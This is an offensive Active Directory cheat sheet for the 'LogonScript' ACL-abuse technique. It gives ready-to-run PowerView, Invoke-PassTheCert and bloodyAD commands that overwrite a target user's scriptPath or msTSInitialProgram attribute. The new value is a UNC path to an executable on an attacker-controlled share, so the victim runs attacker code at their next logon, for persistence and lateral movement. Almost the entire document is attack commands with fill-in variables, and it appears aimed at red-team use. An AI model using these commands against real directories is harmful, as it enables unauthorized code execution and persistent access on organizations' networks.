---
technique: LogonScript
category: acl-abuse
ace: GenericAll, GenericWrite, WriteProperty
targets: User
protocols: LDAP
remote_capable: true
tags: acl-abuse dacl ad logon-script persistence ldap
---

# LogonScript

When a controlled object holds `GenericAll`, `GenericWrite`, or `WriteProperty` over the target user's `scriptPath` or `msTSInitialProgram` attribute, the attacker can set a UNC path pointing to an attacker-controlled share. The script executes in the context of the target user at their next logon. This provides a persistence and lateral movement primitive that does not require interactive access to the target machine.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control of the object |
| GenericWrite | Write to non-protected attributes, including logon script attributes |
| WriteProperty | Write access to a specific attribute, such as scriptPath or msTSInitialProgram |

## Windows

PowerView and Invoke-PassTheCert can both write logon script attributes.

### Set msTSInitialProgram (PowerView)

#powershell #powerview

Set the msTSInitialProgram logon script attribute on a target user using PowerView.

```powershell title:"Write msTSInitialProgram via PowerView"
Set-DomainObject "$target_user" -Set @{'msTSInitialProgram'='\\$lhost\share\run_at_logon.exe'} -Verbose
```
<!-- cheat
var target_user
var lhost
-->

### Set scriptPath (PowerView)

#powershell #powerview

Set the scriptPath logon script attribute on a target user using PowerView.

```powershell title:"Write scriptPath via PowerView"
Set-DomainObject "$target_user" -Set @{'scriptPath'='\\$lhost\share\run_at_logon.exe'} -Verbose
```
<!-- cheat
var target_user
var lhost
-->

### Step 1: Import module for msTSInitialProgram (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 2: Get LDAP connection for msTSInitialProgram (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 3: Write msTSInitialProgram over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Write the msTSInitialProgram logon script attribute over LDAPS using a certificate via Invoke-PassTheCert.

```powershell title:"Write msTSInitialProgram over LDAPS using certificate"
Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $ldap -Object "$target_user_dn" -Attribute 'msTSInitialProgram' -Value "\\$lhost\share\run_at_logon.exe"
```
<!-- cheat
var target_user_dn
var lhost
-->

### Step 4: Import module for scriptPath (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 5: Get LDAP connection for scriptPath (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 6: Write scriptPath over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Write the scriptPath logon script attribute over LDAPS using a certificate via Invoke-PassTheCert.

```powershell title:"Write scriptPath over LDAPS using certificate"
Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $ldap -Object "$target_user_dn" -Attribute 'scriptPath' -Value "\\$lhost\share\run_at_logon.exe"
```
<!-- cheat
var target_user_dn
var lhost
-->

## Linux

bloodyAD writes logon script attributes directly over LDAP.

### Set msTSInitialProgram (bloodyAD)

#ldap #multi-auth

Write the msTSInitialProgram logon script UNC path onto a target user using bloodyAD.

```sh title:"Write msTSInitialProgram via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags set object "$target_user" msTSInitialProgram -v "\\\\$lhost\\share\\run_at_logon.exe"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var lhost
-->

### Set msTSWorkDirectory (bloodyAD)

#ldap #multi-auth

Set the working directory attribute required alongside msTSInitialProgram using bloodyAD.

```sh title:"Write msTSWorkDirectory via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags set object "$target_user" msTSWorkDirectory -v 'C:\'
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### Set scriptPath (bloodyAD)

#ldap #multi-auth

Write the scriptPath logon script UNC path onto a target user using bloodyAD.

```sh title:"Write scriptPath via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags set object "$target_user" scriptPath -v "\\\\$lhost\\share\\run_at_logon.exe"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var lhost
-->
